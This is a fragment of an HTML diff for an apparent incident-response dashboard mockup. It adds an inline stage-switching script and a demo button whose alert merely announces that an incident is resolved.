+                <button class="btn btn-primary" onclick="alert('Incident #INC-89421 completely resolved! Site is 100% clean and patched.')">⚡ Execute 1-Click Full Neutralization</button>
+              </div>
+            </div>
+          </div>
         </div>
 
       </div>
     </main>
   </div>
 
-  <script src="script.js"></script>
+  <script>
+    function switchStage(stageNum, element) {
+      // Deactivate all cards
+      document.querySelectorAll('.stage-card').forEach(card => card.classList.remove('active'));
+      // Activate clicked card
+      element.classList.add('active');
+
+      // Hide all detail containers
+      document.querySelectorAll('.stage-detail-container').forEach(container => container.classList.remove('active'));
+      // Show selected detail container
+      const target = document.getElementById('stage-detail-' + stageNum);
+      if (target) {
+        target.classList.add('active');
+      }
+    }
+  </script>
 </body>
 </html>
